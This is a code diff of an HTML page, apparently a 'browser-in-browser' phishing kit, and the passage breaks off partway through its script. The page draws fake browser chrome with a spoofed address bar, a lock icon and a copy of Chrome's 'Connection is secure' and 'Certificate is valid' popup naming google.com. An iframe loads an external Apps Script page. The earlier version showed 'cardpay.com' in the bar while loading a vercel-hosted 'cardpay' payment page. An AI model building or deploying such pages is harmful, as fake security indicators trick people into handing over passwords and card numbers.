@@ -1,584 +1,1288 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>Browser-in-Browser | Live Web Viewer</title>
+  <title>Browser · Complete Security Popup</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20,400,0,0&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      user-select: none; /* Prevents accidental text selection on buttons, but keeps URL selectable */
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --toolbar-bg: #f1f3f4;
+      --toolbar-border: #dadce0;
+      --url-bg: #ffffff;
+      --url-border: #dadce0;
+      --url-focus-border: #1a73e8;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --text-blue: #1a73e8;
+      --ripple: rgba(0,0,0,0.08);
+      --ripple-active: rgba(0,0,0,0.12);
+      --shadow-toolbar: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.08);
+      --progress-color: #1a73e8;
+      --overlay-bg: rgba(255,255,255,0.85);
+      --menu-bg: #ffffff;
+      --menu-shadow: 0 4px 16px rgba(0,0,0,0.18), 0 1px 4px rgba(0,0,0,0.1);
+      --menu-item-hover: rgba(0,0,0,0.06);
+      --spinner-border: rgba(26,115,232,0.25);
+      --spinner-top: #1a73e8;
+      --iframe-bg: #f1f3f4;
     }
 
-    body {
-      background: #1a1a1a; /* fallback dark, but will be overridden by system detection */
-      height: 100vh;
-      width: 100vw;
-      overflow: hidden;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --toolbar-bg: #2d2e30;
+        --toolbar-border: #3c4043;
+        --url-bg: #1e1e1e;
+        --url-border: #3c4043;
+        --url-focus-border: #8ab4f8;
+        --text-primary: #e8eaed;
+        --text-secondary: #9aa0a6;
+        --text-blue: #8ab4f8;
+        --ripple: rgba(255,255,255,0.08);
+        --ripple-active: rgba(255,255,255,0.12);
+        --progress-color: #8ab4f8;
+        --overlay-bg: rgba(32,33,36,0.88);
+        --menu-bg: #3c4043;
+        --menu-shadow: 0 4px 16px rgba(0,0,0,0.4), 0 1px 4px rgba(0,0,0,0.3);
+        --menu-item-hover: rgba(255,255,255,0.08);
+        --spinner-border: rgba(138,180,248,0.25);
+        --spinner-top: #8ab4f8;
+        --iframe-bg: #2d2e30;
+      }
     }
 
-    /* MAIN CONTAINER: 1:1 browser frame - full viewport */
-    .browser-frame {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+    html, body { height: 100%; width: 100%; overflow: hidden; background: #1e1e1e; }
+
+    /* Browser shell */
+    .browser {
       display: flex;
       flex-direction: column;
-      background: Canvas; /* uses system canvas color (light/dark aware) */
-      box-shadow: none;
+      height: 100%;
+      width: 100%;
+      background: var(--iframe-bg);
     }
 
-    /* TOP BAR - EXACT BROWSER STYLE, NO ROUNDED CORNERS */
-    .browser-topbar {
-      background: -moz-Dialog; /* fallback */
-      background: ButtonFace;  /* native-like background, adapts to system theme */
-      border-bottom: 1px solid ThreeDShadow;
-      padding: 6px 10px;
+    /* Toolbar */
+    .toolbar {
+      background: var(--toolbar-bg);
+      padding: 5px 10px;
       display: flex;
       align-items: center;
-      gap: 12px;
-      flex-shrink: 0;
-      backdrop-filter: none;
-      font-family: system-ui, 'Segoe UI', monospace;
-      font-size: 13px;
-      height: 48px;
-      /* no border-radius */
-      border-radius: 0px;
-      box-shadow: 0 1px 0 rgba(0,0,0,0.05);
-    }
-
-    /* Navigation buttons container */
-    .nav-buttons {
-      display: flex;
       gap: 8px;
-      align-items: center;
+      border-bottom: 1px solid var(--toolbar-border);
+      box-shadow: var(--shadow-toolbar);
+      flex-shrink: 0;
+      height: 48px;
+      position: relative;
+      z-index: 100;
+      user-select: none;
     }
 
-    /* iconic browser buttons (realistic, flat but with hover, no emoji) */
-    .nav-btn {
+    .nav-group { display: flex; gap: 0; }
+
+    .icon-btn {
       background: transparent;
       border: none;
-      width: 32px;
-      height: 32px;
-      display: inline-flex;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      display: flex;
       align-items: center;
       justify-content: center;
       cursor: pointer;
-      border-radius: 6px;
-      transition: background 0.08s linear;
-      font-size: 18px;
-      font-weight: 500;
-      color: WindowText;
-      font-family: system-ui, 'Segoe UI', 'SF Pro Text', monospace;
+      position: relative;
+      overflow: hidden;
+      transition: background 0.15s ease;
+      flex-shrink: 0;
+    }
+    .icon-btn .ms {
+      font-family: 'Material Symbols Rounded';
+      font-size: 20px;
+      color: var(--text-secondary);
+      transition: color 0.15s;
+      pointer-events: none;
+      line-height: 1;
+    }
+    .icon-btn:hover { background: var(--ripple); }
+    .icon-btn:active { background: var(--ripple-active); transform: scale(0.95); }
+    .icon-btn.disabled { opacity: 0.35; cursor: default; pointer-events: none; }
+
+    .ripple-wave {
+      position: absolute;
+      border-radius: 50%;
+      transform: scale(0);
+      background: rgba(0,0,0,0.15);
+      animation: ripple-anim 0.4s linear;
+      pointer-events: none;
+    }
+    @keyframes ripple-anim {
+      to { transform: scale(4); opacity: 0; }
     }
 
-    /* Use SVG-like unicode symbols but crisp and realistic font icons */
-    .nav-btn svg {
+    .favicon-wrap {
       width: 18px;
       height: 18px;
-      fill: currentColor;
-      stroke: none;
-      display: block;
-      pointer-events: none;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .favicon-wrap .ms {
+      font-family: 'Material Symbols Rounded';
+      font-size: 16px;
+      color: var(--text-secondary);
+    }
+    #faviconImg {
+      width: 16px;
+      height: 16px;
+      display: none;
+      border-radius: 2px;
     }
 
-    .nav-btn:hover {
-      background: rgba(0,0,0,0.08);
-    }
-
-    .nav-btn:active {
-      background: rgba(0,0,0,0.15);
-    }
-
-    /* disabled state */
-    .nav-btn.disabled {
-      opacity: 0.4;
-      cursor: default;
-      pointer-events: none;
-    }
-
-    /* URL BAR — exact like real browser, non-editable but selectable text */
-    .url-container {
+    .url-bar {
       flex: 1;
-      background: Field; /* system background for input fields */
-      border: 1px solid ThreeDShadow;
-      border-radius: 6px;
+      background: var(--url-bg);
+      border: 1.5px solid var(--url-border);
+      border-radius: 24px;
       height: 36px;
       display: flex;
       align-items: center;
-      padding: 0 12px;
-      font-size: 13px;
-      font-family: 'SF Mono', 'Menlo', 'Cascadia Code', monospace;
-      color: WindowText;
-      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
-    }
-
-    .url-text {
-      flex: 1;
-      background: transparent;
-      border: none;
-      outline: none;
-      font-family: inherit;
-      font-size: 13px;
-      color: inherit;
+      padding: 0 10px;
+      gap: 6px;
       cursor: text;
-      user-select: text;
-      white-space: nowrap;
-      overflow-x: auto;
-      overflow-y: hidden;
-      scrollbar-width: thin;
-      line-height: 1.4;
+      transition: border-color 0.15s, box-shadow 0.15s;
+      min-width: 0;
+    }
+    .url-bar:focus-within {
+      border-color: var(--url-focus-border);
+      box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
     }
 
-    .url-text:focus {
-      outline: none;
-    }
-
-    /* lock icon / secure indicator */
-    .lock-icon {
-      margin-right: 8px;
+    /* Custom lock icon in URL bar (circular, light grey hover) */
+    .secure-icon-custom {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      background: transparent;
       display: flex;
       align-items: center;
-      opacity: 0.75;
+      justify-content: center;
+      cursor: pointer;
+      flex-shrink: 0;
+      transition: background 0.15s;
+    }
+    .secure-icon-custom:hover {
+      background: var(--ripple);
+    }
+    .secure-icon-custom img {
+      width: 13px;
+      height: 13px;
+      object-fit: contain;
+      filter: brightness(0) invert(1);
+      pointer-events: none;
     }
 
-    .lock-icon svg {
-      width: 14px;
-      height: 14px;
-      fill: currentColor;
-    }
-
-    /* Reload / refresh button specific style */
-    .refresh-btn svg {
-      transform: scale(0.95);
-    }
-
-    /* IFRAME container - full remaining area, no rounding */
-    .webview-container {
+    #urlInput {
       flex: 1;
-      width: 100%;
-      background: #fff;
-      overflow: hidden;
       border: none;
+      outline: none;
+      background: transparent;
+      font-family: 'Google Sans', -apple-system, sans-serif;
+      font-size: 13.5px;
+      font-weight: 500;
+      color: var(--text-primary);
+      min-width: 0;
+      cursor: text;
+    }
+    #urlInput::selection { background: rgba(26,115,232,0.25); }
+
+    /* Progress bar */
+    .progress-track {
+      height: 2px;
+      width: 100%;
+      background: transparent;
+      overflow: hidden;
+      flex-shrink: 0;
+      position: relative;
+      z-index: 99;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: var(--progress-color);
+      opacity: 0;
+      transition: width 0.25s ease-out, opacity 0.2s;
+      border-radius: 0 2px 2px 0;
       position: relative;
     }
+    .progress-bar::after {
+      content: '';
+      position: absolute;
+      right: 0;
+      top: 0;
+      width: 60px;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+      animation: shimmer 1s ease-in-out infinite;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+    .progress-bar.active::after { opacity: 1; }
+    @keyframes shimmer {
+      0% { transform: translateX(-60px); }
+      100% { transform: translateX(60px); }
+    }
 
+    .iframe-wrapper {
+      flex: 1;
+      position: relative;
+      overflow: hidden;
+      min-height: 0;
+    }
     iframe {
       width: 100%;
       height: 100%;
       border: none;
-      background: white;
       display: block;
+      background: white;
     }
 
-    /* fallback for loading errors */
-    .error-overlay {
+    .overlay {
+      position: absolute;
+      inset: 0;
+      background: var(--overlay-bg);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
       display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      z-index: 50;
+      transition: opacity 0.2s;
+    }
+    .overlay.visible { display: flex; }
+    .spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid var(--spinner-border);
+      border-top-color: var(--spinner-top);
+      border-radius: 50%;
+      animation: spin 0.75s cubic-bezier(0.4,0,0.2,1) infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .overlay-msg {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      text-align: center;
+      padding: 0 24px;
+    }
+    .overlay-msg .err-icon {
+      font-family: 'Material Symbols Rounded';
+      font-size: 40px;
+      color: var(--text-secondary);
+    }
+    .overlay-msg p {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 14px;
+      color: var(--text-secondary);
+      line-height: 1.5;
+      max-width: 280px;
+    }
+    .overlay-msg .retry-btn {
+      margin-top: 4px;
+      padding: 8px 22px;
+      border-radius: 20px;
+      border: none;
+      background: var(--text-blue);
+      color: #fff;
+      font-family: 'Google Sans', sans-serif;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    .retry-btn:hover { opacity: 0.88; }
+    .retry-btn:active { transform: scale(0.97); }
+
+    /* Three-dot menu */
+    .menu-wrap { position: relative; }
+    .dropdown-menu {
+      position: absolute;
+      top: calc(100% + 6px);
+      right: 0;
+      background: var(--menu-bg);
+      border-radius: 10px;
+      box-shadow: var(--menu-shadow);
+      min-width: 170px;
+      overflow: hidden;
+      opacity: 0;
+      transform: translateY(-6px) scale(0.97);
+      transform-origin: top right;
+      pointer-events: none;
+      transition: opacity 0.15s ease, transform 0.15s ease;
+      z-index: 200;
+    }
+    .dropdown-menu.open {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+      pointer-events: auto;
+    }
+    .menu-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 14px;
+      font-family: 'Google Sans', sans-serif;
+      font-size: 13px;
+      color: var(--text-primary);
+      cursor: pointer;
+      transition: background 0.1s;
+    }
+    .menu-item:hover { background: var(--menu-item-hover); }
+    .menu-item .ms { font-family: 'Material Symbols Rounded'; font-size: 17px; color: var(--text-secondary); }
+    .menu-divider { height: 1px; background: var(--toolbar-border); margin: 4px 0; }
+
+    /* ========== SECURITY POPUP (exactly as requested) ========== */
+    .popup {
+      position: fixed;
+      top: 28px;
+      left: 0;
+      width: 284px;
+      height: auto;
+      background: #202124;
+      border: 1px solid #5f6368;
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+      font-family: 'Roboto', sans-serif;
+      z-index: 9999;
+      pointer-events: none;
+      opacity: 0;
+      transform: translateY(-4px);
+      transition: opacity 0.12s ease, transform 0.12s ease;
+    }
+    .popup.open {
+      opacity: 1;
+      transform: translateY(0);
+      pointer-events: auto;
     }
 
-    /* system theme adaptive: detect light/dark and use native colors */
-    @media (prefers-color-scheme: dark) {
-      .browser-topbar {
-        background: #2b2b2b;
-        border-bottom-color: #3c3c3c;
-      }
-      .url-container {
-        background: #1e1e1e;
-        border-color: #3c3c3c;
-        color: #f0f0f0;
-      }
-      .nav-btn {
-        color: #e0e0e0;
-      }
-      .nav-btn:hover {
-        background: rgba(255,255,255,0.1);
-      }
-      .nav-btn:active {
-        background: rgba(255,255,255,0.2);
-      }
+    .header {
+      position: relative;
+      display: flex;
+      align-items: center;
+      padding: 10px 12px 6px 12px;
+      gap: 6px;
+      background: #202124;
+    }
+    /* MODIFIED: Back and close buttons now circular (28px, border-radius 50%) */
+    .back, .close {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      opacity: 0.85;
+      transition: background 0.15s ease;
+      flex-shrink: 0;
+      background: transparent;
+      border: none;
+    }
+    .back:hover, .close:hover {
+      background: rgba(255,255,255,0.08);
+      opacity: 1;
+    }
+    .back svg, .close svg {
+      width: 18px;
+      height: 18px;
+      fill: #e8eaed;
+      pointer-events: none;
+    }
+    .title-wrap {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+    }
+    .title {
+      font-size: 15px;
+      font-weight: 440;
+      line-height: 18px;
+      color: #e8eaed;
+      letter-spacing: 0.25px;
+    }
+    .domain {
+      font-size: 11px;
+      font-weight: 400;
+      color: #9aa0a6;
+      line-height: 14px;
+      margin-top: 2px;
     }
 
-    @media (prefers-color-scheme: light) {
-      .browser-topbar {
-        background: #f0f0f0;
-        border-bottom-color: #b0b0b0;
-      }
-      .url-container {
-        background: white;
-        border-color: #c0c0c0;
-      }
+    .separator {
+      width: 100%;
+      height: 1px;
+      background: #5f6368;
+      opacity: 0.7;
     }
 
-    /* make scrollbar native */
-    ::-webkit-scrollbar {
-      width: 10px;
-      height: 10px;
+    .main-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      padding: 12px 14px 12px 14px;
+      background: #202124;
     }
-    .url-text::-webkit-scrollbar {
-      height: 4px;
+    .main-icon {
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+      margin-top: 2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .content-title {
+      font-size: 12.5px;
+      font-weight: 500;
+      line-height: 18px;
+      color: #e8eaed;
+      letter-spacing: 0.1px;
+      margin-bottom: 2px;
+    }
+    .content-text {
+      font-size: 10px;
+      line-height: 15px;
+      color: #e8eaed;
+      font-weight: 300;
+      letter-spacing: 0.06px;
+      white-space: normal;
+      word-break: normal;
+      max-width: 210px;
+    }
+    .learn {
+      color: #8ab4f8;
+      text-decoration: underline;
+      text-decoration-thickness: 1px;
+      text-underline-offset: 2px;
+      font-weight: 350;
+      font-size: 10px;
+      cursor: pointer;
+      transition: opacity 0.1s ease;
+      display: inline-block;
+    }
+    .learn:hover { opacity: 0.9; color: #96bafd; }
+
+    /* bottom row (certificate) */
+    .bottom-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px 12px 14px;
+      background: #202124;
+      transition: background-color 0.15s ease;
+      cursor: pointer;
+    }
+    .bottom-row:hover { background-color: #2a2c30; }
+    .bottom-row:active { background-color: #35373d; }
+    .bottom-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      pointer-events: none;
+    }
+    .bottom-left .main-icon {
+      margin-top: 0;
+      width: 15px;
+      height: 15px;
+      position: relative;
+      top: -2.5px;
+    }
+    .bottom-title {
+      font-size: 12px;
+      font-weight: 500;
+      color: #e8eaed;
+      letter-spacing: 0.1px;
+      line-height: 16px;
+    }
+    .open-icon {
+      width: 16px;
+      height: 16px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0.75;
+      pointer-events: none;
+    }
+    .open-icon svg {
+      width: 16px;
+      height: 16px;
+      fill: #9aa0a6;
+    }
+
+    /* prevent selection/drag */
+    a, img, svg, .back, .close, .main-icon, .open-icon {
+      -webkit-user-drag: none;
+      user-select: none;
+    }
+    .content-text, .content-text * {
+      user-select: none;
+    }
+      
+    .bottom-left .main-icon {
+      top: -1px !important;   /* or 0px, or even 1px to move it further down */
     }
   </style>
 </head>
 <body>
-<div class="browser-frame" id="browserFrame">
-  <!-- top bar: identical to native browser layout -->
-  <div class="browser-topbar">
-    <div class="nav-buttons">
-      <!-- Back button with SVG arrow (identical to chromium style) -->
-      <button class="nav-btn back-btn" id="backBtn" aria-label="Go back">
-        <svg viewBox="0 0 24 24" width="18" height="18">
-          <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" fill="currentColor"/>
-        </svg>
+<div class="browser">
+
+  <!-- Toolbar -->
+  <div class="toolbar" id="toolbar">
+    <div class="nav-group">
+      <button class="icon-btn disabled" id="backBtn" title="Go back (Alt+Left)">
+        <span class="ms">arrow_back</span>
       </button>
-      <!-- Forward button -->
-      <button class="nav-btn forward-btn" id="forwardBtn" aria-label="Go forward">
-        <svg viewBox="0 0 24 24" width="18" height="18">
-          <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" fill="currentColor"/>
-        </svg>
+      <button class="icon-btn disabled" id="fwdBtn" title="Go forward (Alt+Right)">
+        <span class="ms">arrow_forward</span>
       </button>
-      <!-- Refresh / Reload button -->
-      <button class="nav-btn refresh-btn" id="refreshBtn" aria-label="Reload">
-        <svg viewBox="0 0 24 24" width="18" height="18">
-          <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" fill="currentColor"/>
-        </svg>
+      <button class="icon-btn" id="refreshBtn" title="Reload page (Ctrl+R)">
+        <span class="ms" id="refreshIcon">refresh</span>
       </button>
     </div>
 
-    <!-- URL bar: fixed, non-editable, but fully selectable (realistic address bar) -->
-    <div class="url-container">
-      <div class="lock-icon" id="lockIcon">
-        <svg viewBox="0 0 24 24" width="14" height="14">
-          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="currentColor"/>
-        </svg>
+    <div class="url-bar" id="urlBar">
+      <div class="secure-icon-custom" id="customSecureIcon">
+        <img src="https://storage.googleapis.com/support-kms-prod/S76Rs1BC1QDxT8zpF3tATLDsc5oxceWYIPHN" alt="Secure" draggable="false">
       </div>
-      <div class="url-text" id="urlDisplay" contenteditable="false">cardpay.com</div>
+      <div class="favicon-wrap">
+        <img id="faviconImg" alt="">
+        <span class="ms" id="faviconDefault">globe</span>
+      </div>
+      <input type="text" id="urlInput" spellcheck="false" autocomplete="off" autocorrect="off"
+             aria-label="Address bar" placeholder="Search or enter address">
     </div>
-    <!-- dummy spacer for alignment (like extra menu but none) -->
-    <div style="width: 32px;"></div>
+
+    <div class="menu-wrap" id="menuWrap">
+      <button class="icon-btn" id="menuBtn" title="More options">
+        <span class="ms">more_vert</span>
+      </button>
+      <div class="dropdown-menu" id="dropdownMenu">
+        <div class="menu-item" id="menuReload"><span class="ms">refresh</span> Reload</div>
+        <div class="menu-item" id="menuCopyUrl"><span class="ms">content_copy</span> Copy URL</div>
+        <div class="menu-divider"></div>
+        <div class="menu-item" id="menuNewTab"><span class="ms">open_in_new</span> Open in new tab</div>
+      </div>
+    </div>
   </div>
 
-  <!-- Web content iframe: displays full web pages -->
-  <div class="webview-container">
-    <iframe id="webFrame" title="Live browser window" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation allow-popups-to-escape-sandbox allow-downloads"></iframe>
+  <!-- Security Popup (fully styled with icons) -->
+  <div class="popup" id="securityPopup">
+    <div class="header">
+      <div class="back" id="popupBackBtn">
+        <svg viewBox="0 0 24 24">
+          <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+        </svg>
+      </div>
+      <div class="title-wrap">
+        <div class="title">Security</div>
+        <div class="domain" id="popupDomain">google.com</div>
+      </div>
+      <div class="close" id="popupCloseBtn">
+        <svg viewBox="0 0 24 24">
+          <path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+        </svg>
+      </div>
+    </div>
+
+    <div class="separator"></div>
+
+    <div class="main-row">
+      <div class="main-icon" id="secureLockIcon"></div>
+      <div>
+        <div class="content-title">Connection is secure</div>
+        <div class="content-text">
+          Your information (for example, passwords or<br>
+          credit card numbers) is private when it is sent<br>
+          to this site. <a class="learn" href="https://support.google.com/chrome?p=ui_security_indicator" target="_blank" rel="noopener noreferrer" draggable="false">Learn more</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="bottom-row" id="certificateBox">
+      <div class="bottom-left">
+        <div class="main-icon" id="certIcon"></div>
+        <div class="bottom-title">Certificate is valid</div>
+      </div>
+      <div class="open-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M14 3v2h3.59L7 15.59 8.41 17 19 6.41V10h2V3z"></path>
+          <path d="M19 19H5V5h7V3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-7h-2z"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <!-- Progress & iframe -->
+  <div class="progress-track"><div class="progress-bar" id="progressBar"></div></div>
+  <div class="iframe-wrapper">
+    <div class="overlay" id="overlay">
+      <div class="spinner" id="spinner"></div>
+      <div class="overlay-msg" id="overlayMsg">
+        <span class="err-icon ms">cloud_off</span>
+        <p id="overlayMsgText">This site is taking too long to respond.</p>
+        <button class="retry-btn" id="retryBtn">Reload</button>
+      </div>
+    </div>
+    <iframe id="webFrame" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-downloads allow-popups-to-escape-sandbox"></iframe>
   </div>
 </div>
 
 <script>
-  (function() {
-    // Get elements
-    const iframe = document.getElementById('webFrame');
-    const backBtn = document.getElementById('backBtn');
-    const forwardBtn = document.getElementById('forwardBtn');
-    const refreshBtn = document.getElementById('refreshBtn');
-    const urlDisplaySpan = document.getElementById('urlDisplay');
-    const lockIconContainer = document.getElementById('lockIcon');
+let openTimeout = null;
 
-    // History stack for internal navigation (since we need full control of iframe navigation)
-    // We'll implement a smart navigation history that tracks URLs within the iframe,
-    // support back/forward, and also respects iframe's native navigation events.
-    let historyStack = [];
-    let currentIndex = -1;
+(function() {
+  'use strict';
 
-    // Starting URL (default duckduckgo for privacy/real browsing, but attractive)
-    const DEFAULT_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
-    let currentUrl = DEFAULT_URL;
+  const START_URL = 'https://script.google.com/macros/s/AKfycbwz1tvHc7EoSaID2oTdyVQMjqySCYekDE6m9CVkpvVJGA2Z5iY4xDG03LYu-e2uqkw/exec';
+  const TIMEOUT_MS   = 10000;
+  const FINISH_DELAY = 280;
 
-    // Flag to avoid loops with iframe loads
-    let isInternalNavigation = false;
-    let pendingUrlUpdate = null;
+  const iframe      = document.getElementById('webFrame');
+  const backBtn     = document.getElementById('backBtn');
+  const fwdBtn      = document.getElementById('fwdBtn');
+  const refreshBtn  = document.getElementById('refreshBtn');
+  const refreshIcon = document.getElementById('refreshIcon');
+  const urlInput    = document.getElementById('urlInput');
+  const secureTrigger = document.getElementById('customSecureIcon');
+  const secPopup    = document.getElementById('securityPopup');
+  const progressBar = document.getElementById('progressBar');
+  const overlay     = document.getElementById('overlay');
+  const spinner     = document.getElementById('spinner');
+  const overlayMsg  = document.getElementById('overlayMsg');
+  const overlayText = document.getElementById('overlayMsgText');
+  const retryBtn    = document.getElementById('retryBtn');
+  const menuBtn     = document.getElementById('menuBtn');
+  const dropMenu    = document.getElementById('dropdownMenu');
+  const menuReload  = document.getElementById('menuReload');
+  const menuCopyUrl = document.getElementById('menuCopyUrl');
+  const menuNewTab  = document.getElementById('menuNewTab');
+  const faviconImg  = document.getElementById('faviconImg');
+  const faviconDef  = document.getElementById('faviconDefault');
 
-    // Helper: update URL bar and lock icon based on current URL
-    function updateUrlBar(url) {
-      if (!url) return;
-      // Clean URL for display (remove trailing slash etc, but keep as is)
-      let displayUrl = url;
-      try {
-        const urlObj = new URL(url);
-        displayUrl = urlObj.href;
-        // Show lock for https, otherwise neutral
-        if (urlObj.protocol === 'https:') {
-          lockIconContainer.style.opacity = '1';
-          lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="currentColor"/></svg>`;
-        } else {
-          lockIconContainer.style.opacity = '0.6';
-          lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 2C8.13 2 5 5.13 5 9v4c0 .78.16 1.53.46 2.22L3.7 16.97C3.26 17.83 3.91 18.79 4.87 18.79H19.13c.96 0 1.61-.96 1.17-1.82l-1.76-2.75c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z" fill="currentColor"/><path d="M12 21c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z"/></svg>`;
-        }
-      } catch (e) {
-        lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 2C8.13 2 5 5.13 5 9v4c0 .78.16 1.53.46 2.22L3.7 16.97C3.26 17.83 3.91 18.79 4.87 18.79H19.13c.96 0 1.61-.96 1.17-1.82l-1.76-2.75c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z" fill="currentColor"/><path d="M12 21c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z"/></svg>`;
-        lockIconContainer.style.opacity = '0.6';
-      }
-      urlDisplaySpan.innerText = displayUrl;
+  let history      = [START_URL];
+  let histIdx      = 0;
+  let isLoading    = false;
+  let progTimer    = null;
+  let timeoutTimer = null;
+  let progWidth    = 0;
+  let suppressLoad = false;
+  let currentUrl   = START_URL;
+
+  function updateNavBtns () {
+    backBtn.classList.toggle('disabled', histIdx <= 0);
+    fwdBtn.classList.toggle('disabled', histIdx >= history.length - 1);
+  }
+
+  function pushHistory (url) {
+    if (histIdx < history.length - 1) history.splice(histIdx + 1);
+    if (history[histIdx] !== url) {
+      history.push(url);
+      histIdx = history.length - 1;
     }
+    updateNavBtns();
+  }
 
-    // Normalize URL (if missing protocol, add https://)
-    function normalizeUrl(input) {
-      let str = input.trim();
-      if (str === '') return DEFAULT_URL;
-      if (!/^https?:\/\//i.test(str) && !/^file:\/\//i.test(str) && !/^chrome:\/\//i.test(str)) {
-        return 'https://' + str;
+  function startProgress () {
+    progWidth = 0;
+    progressBar.style.width = '0%';
+    progressBar.style.opacity = '1';
+    progressBar.classList.add('active');
+    if (progTimer) clearInterval(progTimer);
+    progTimer = setInterval(() => {
+      if (progWidth < 88) {
+        const step = (88 - progWidth) * 0.06 + 1.5;
+        progWidth = Math.min(88, progWidth + step);
+        progressBar.style.width = progWidth + '%';
       }
-      return str;
+    }, 120);
+  }
+
+  function finishProgress (cb) {
+    if (progTimer) { clearInterval(progTimer); progTimer = null; }
+    progressBar.style.width = '100%';
+    setTimeout(() => {
+      progressBar.style.opacity = '0';
+      progressBar.classList.remove('active');
+      setTimeout(() => { progressBar.style.width = '0%'; if (cb) cb(); }, 100);
+    }, FINISH_DELAY);
+  }
+
+  function beginLoading () {
+    if (isLoading) endLoading(false);
+    isLoading = true;
+    refreshIcon.textContent = 'close';
+    overlayMsg.style.display = 'none';
+    spinner.style.display = 'block';
+    overlay.classList.add('visible');
+    startProgress();
+    if (timeoutTimer) clearTimeout(timeoutTimer);
+    timeoutTimer = setTimeout(() => {
+      if (isLoading) showLoadError('This site is taking too long to respond.');
+    }, TIMEOUT_MS);
+  }
+
+  function endLoading () {
+    if (!isLoading) return;
+    isLoading = false;
+    if (timeoutTimer) clearTimeout(timeoutTimer);
+    refreshIcon.textContent = 'refresh';
